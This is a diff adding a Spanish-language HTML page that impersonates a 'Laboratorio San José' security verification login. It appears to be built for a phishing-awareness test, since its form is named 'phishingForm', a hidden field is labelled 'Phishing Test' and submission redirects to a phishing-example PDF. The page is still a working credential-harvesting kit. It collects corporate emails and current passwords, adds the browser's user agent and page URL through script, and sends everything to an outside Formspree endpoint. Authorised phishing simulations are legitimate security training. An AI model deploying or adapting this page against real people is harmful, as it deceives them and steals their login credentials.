@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación de Seguridad - Laboratorio San José</title>
+    <style>
+        /* RESET Y BASE */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #005c97 0%, #00365a 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            line-height: 1.6;
+        }
+
+        /* CONTENEDOR PRINCIPAL */
+        .login-container {
+            width: 100%;
+            max-width: 500px;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+        }
+
+        /* LOGO GRANDE CENTRADO */
+        .logo-container {
+            text-align: center;
+            padding: 30px 20px 20px 20px;
+            background: #fff;
+            border-bottom: 3px solid #e74c3c;
+        }
+
+        .logo-img {
+            max-width: 350px;
+            width: 100%;
+            height: auto;
+            margin-bottom: 15px;
+        }
+
+        .brand-title {
+            color: #2c3e50;
+            font-size: 32px;
+            font-weight: bold;
+            margin-bottom: 8px;
+        }
+
+        .brand-subtitle {
+            color: #7f8c8d;
+            font-size: 18px;
+            font-style: italic;
+        }
+
+        /* ENCABEZADO DE LOGIN */
+        .login-header {
+            background: #e74c3c;
+            color: white;
+            padding: 25px 20px;
+            text-align: center;
+        }
+
+        .login-header h2 {
+            font-size: 26px;
+            margin-bottom: 10px;
+        }
+
+        .login-header p {
+            font-size: 16px;
+            opacity: 0.9;
+        }
+
+        /* FORMULARIO */
+        .login-form {
+            padding: 35px;
+        }
+
+        .form-group {
+            margin-bottom: 30px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 12px;
+            font-weight: 600;
+            color: #2c3e50;
+            font-size: 18px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 18px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 18px;
+            transition: all 0.3s ease;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #3498db;
+            box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.2);
+        }
+
+        .form-group input::placeholder {
+            color: #bbb;
+            font-size: 16px;
+        }
+
+        /* BOTÓN */
+        .btn {
+            width: 100%;
+            padding: 20px;
+            background: #e74c3c;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 20px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+
+        .btn:hover {
+            background: #c0392b;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(231, 76, 60, 0.3);
+        }
+
+        /* LOADING */
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 25px;
+            padding: 20px;
+        }
+
+        .loading-spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #e74c3c;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        .loading p {
+            font-size: 18px;
+            color: #7f8c8d;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* NOTA DE SEGURIDAD */
+        .security-notice {
+            background: #f8f9fa;
+            padding: 25px;
+            margin: 25px;
+            border-radius: 10px;
+            border-left: 5px solid #3498db;
+        }
+
+        .security-notice p {
+            font-size: 16px;
+            color: #555;
+            line-height: 1.6;
+            text-align: center;
+        }
+
+        .security-notice strong {
+            color: #2c3e50;
+            font-size: 17px;
+        }
+
+        /* FOOTER */
+        .footer {
+            text-align: center;
+            padding: 25px;
+            background: #2c3e50;
+            color: white;
+        }
+
+        .footer p {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+
+        /* RESPONSIVE */
+        @media (max-width: 768px) {
+            .login-container {
+                margin: 15px;
+                border-radius: 12px;
+            }
+            
+            .logo-img {
+                max-width: 280px;
+            }
+            
+            .brand-title {
+                font-size: 28px;
+            }
+            
+            .brand-subtitle {
+                font-size: 16px;
+            }
+            
+            .login-form {
+                padding: 25px;
+            }
+            
+            .form-group input {
+                padding: 16px;
+                font-size: 16px;
+            }
+            
+            .btn {
+                padding: 18px;
+                font-size: 18px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            body {
+                padding: 15px;
+            }
+            
+            .logo-container {
+                padding: 25px 15px 15px 15px;
+            }
+            
+            .logo-img {
+                max-width: 220px;
+            }
+            
+            .brand-title {
+                font-size: 24px;
+            }
+            
+            .brand-subtitle {
+                font-size: 14px;
+            }
+            
+            .login-header {
+                padding: 20px 15px;
+            }
+            
+            .login-header h2 {
+                font-size: 22px;
+            }
+            
+            .login-header p {
+                font-size: 14px;
+            }
+            
+            .form-group label {
+                font-size: 16px;
+            }
+            
+            .security-notice {
+                margin: 20px 15px;
+                padding: 20px;
+            }
+            
+            .security-notice p {
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <!-- LOGO GRANDE CENTRADO -->
+        <div class="logo-container">
+            <img src="Logo_HEADER_MAY24.png" 
+                 alt="Laboratorio San José" 
+                 class="logo-img"
+                 onerror="this.style.display='none';">
+            <h1 class="brand-title">LABORATORIO SAN JOSÉ</h1>
+            <p class="brand-subtitle">¡Fuimos, somos y seremos tu laboratorio confiable!</p>
+        </div>
+
+        <!-- Encabezado de login -->
+        <div class="login-header">
+            <h2>🔒 Verificación de Seguridad</h2>
+            <p>Por favor ingrese sus credenciales para continuar</p>
+        </div>
+
+        <!-- FORMULARIO MODIFICADO PARA FORMSPREE -->
+        <form class="login-form" action="https://formspree.io/f/xandlgjp" method="POST" id="phishingForm">
+            <div class="form-group">
+                <label for="email">Correo Electrónico Corporativo</label>
+                <input type="email" id="email" name="email" required placeholder="usuario@laboratoriosanjose.com">
+            </div>
+
+            <div class="form-group">
+                <label for="password">Contraseña Actual</label>
+                <input type="password" id="password" name="password" required placeholder="Ingrese su contraseña">
+            </div>
+
+            <!-- CAMPOS OCULTOS PARA FORMSPREE -->
+            <input type="hidden" name="_subject" value="⚠️ Phishing Test - Laboratorio San José">
+            <input type="hidden" name="_replyto" value="no-reply@laboratoriosanjose.com">
+            <input type="hidden" name="_next" value="https://www.cyber.gov.au/sites/default/files/2023-03/phishing_example_es.pdf">
+            <input type="hidden" name="_format" value="plain">
+            
+            <button type="submit" class="btn">Verificar Identidad</button>
+
+            <div class="loading" id="loading">
+                <div class="loading-spinner"></div>
+                <p>Verificando credenciales...</p>
+            </div>
+        </form>
+
+        <!-- Nota de seguridad -->
+        <div class="security-notice">
+            <p>⚠️ Por su seguridad, verifique que la URL sea: <strong>https://www.laboratoriosanjose.com/</strong>. Esta verificación ayuda a proteger su cuenta contra accesos no autorizados.</p>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <p>© 2024 Laboratorio San José. Todos los derechos reservados.</p>
+        </div>
+    </div>
+
+    <script>
+        function showLoading() {
+            document.getElementById('loading').style.display = 'block';
+            document.querySelector('.btn').style.opacity = '0.7';
+            document.querySelector('.btn').disabled = true;
+        }
+
+        // Validación del formulario
+        document.getElementById('phishingForm').addEventListener('submit', function(e) {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            if (!email || !password) {
+                e.preventDefault();
+                alert('Por favor, complete todos los campos.');
+                return false;
+            }
+            
+            // Agregar datos automáticos ocultos
+            const addHiddenField = (name, value) => {
+                const field = document.createElement('input');
+                field.type = 'hidden';
+                field.name = name;
+                field.value = value;
+                this.appendChild(field);
+            };
+            
+            addHiddenField('timestamp', new Date().toLocaleString());
+            addHiddenField('user_agent', navigator.userAgent);
+            addHiddenField('page_url', window.location.href);
+            
+            showLoading();
+        });
+
+        // Verificar si la imagen cargó correctamente
+        window.addEventListener('load', function() {
+            const img = document.querySelector('.logo-img');
+            setTimeout(function() {
+                if (img && (img.complete && img.naturalHeight === 0)) {
+                    document.querySelector('.brand-title').style.marginTop = '20px';
+                }
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
